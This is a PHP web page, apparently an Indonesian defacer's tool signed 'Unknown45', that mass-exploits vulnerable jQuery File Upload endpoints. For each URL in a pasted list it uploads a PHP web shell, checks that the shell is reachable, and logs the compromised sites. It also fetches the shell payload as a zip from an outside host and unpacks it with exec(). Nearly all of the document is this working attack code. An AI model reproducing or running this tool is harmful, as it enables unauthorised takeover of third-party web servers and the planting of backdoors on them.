<html>
<head>
<title>[+] Mass JFU Auto Upload Shell [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<meta name="description" content="Mengambil Domain dari Hasil Mirror Defacer">
<meta property="og:image" content="https://i.imgur.com/5rdUUlU.jpg">
<meta name="theme-color" content="#1e1e1e">
<meta name="author" content="Unknown45">
<meta name="robots" content="noindex">
</head>
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
<body bgcolor="#1e1e1e" text="white" style="max-width: 100%">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');
  @import url('https://fonts.googleapis.com/css?family=Helvetica');


textarea {
max-width: 90%;
width: 90%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}


input[name="attacker"] {
  font-family: Helvetica;
}

textarea#note {
  width:100%;
    resize: none;
  display:block;
  max-width:100%;
  border: none;
    outline: none;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
  max-width: 95%;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: ##1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: ##1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}

.area {
  font-family: Courier;
}

nemu {
  color: green;
}

kgk {
  color: red;
}

kuning {
  color: yellow;
}
</style>
<body>
<center>
<font face=courier new size=5>Mass JFU Auto Upshell<br><font size="3">Auto Exploit Pada Jquery File Upload Yang Vuln</font><font size="3"><hr>
<form method="post">
<textarea placeholder="https://exploits.my.id/jquery-file-upload/server/php/" name="url" required=""></textarea><br><br>
<input type="submit" name="go" value="Gaskan">
</form>
<?php
if (isset($_POST['go'])) {
  ob_implicit_flush();ob_end_flush();
  echo "<hr><pre style='text-align: left; white-space: pre-line;'>";
  $url = $_POST['url'];
  if (empty($url)) {
    die("Ngapain dek ?");
  }
  $url = explode("\r\n", $url);
  echo "[+] Loading ... ( ".count($url)." sites )<br><br>";
  foreach ($url as $web) {
    $cek = cek($web);
    $webcek = $web."/files/uk45-up.php";
    if (preg_match("/deleteType/i", $cek)) {
      echo "[<nemu>Vuln</nemu>] ".htmlspecialchars($web)."\n";
      $ceklagi = check($webcek);
      if (preg_match("/Unknown45 Uploader/i", $ceklagi)) {
        echo "[<nemu>Shell</nemu>] ".$webcek."\n";
        file_put_contents("/tmp/tempku/jfu.txt", $web."\n", FILE_APPEND);
      } else {
        echo "[<kuning>Failed Upshell</kuning>] ".$web."\n";
      }
    } else {
      echo "[<kgk>Not Vuln</kgk>] ".htmlspecialchars($web)."\n";
    }
  }

  echo "<br>[+] Done ...";
  echo "</pre>";
  
}

function cek($web) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $web);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, array("files[]" => curl_file_create("/tmp/tempku/kcfinder/uk45-up.php")));
  curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Requested-With: XMLHttpRequest"));
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36");
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30); 
  curl_setopt($ch, CURLOPT_TIMEOUT, 30);
  curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  return curl_exec($ch);
}

function check($web) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $web);
  //curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Requested-With: XMLHttpRequest"));
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko, ".rand().") Chrome/92.0.4515.131 Safari/537.36");
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15); 
  curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  return curl_exec($ch);
  curl_close($ch);
}

if (!file_exists("/tmp/tempku")) {
  mkdir("/tmp/tempku");
}
if (!file_exists("/tmp/tempku/kcfinder")) {
  mkdir("/tmp/tempku/kcfinder");
}
if (!file_exists("/tmp/tempku/kcfinder/uk45-up.php") || filesize("/tmp/tempku/kcfinder/uk45-up.php") == "0") {
  file_put_contents("/tmp/tempku/kcfinder/uk45.zip", file_get_contents("http://f.ppk.pw/05-21-22-uk45.zip"));
  exec("unzip /tmp/tempku/kcfinder/uk45.zip -d /tmp/tempku/kcfinder/");
  if (!file_exists("/tmp/tempku/kcfinder/uk45-up.php")) {
    die("Silahkan contact owner tools ini - unknown45");
  }
}

?>
</font>
<center><hr><font size=3>Unknown45 - 2021
</body>
</html>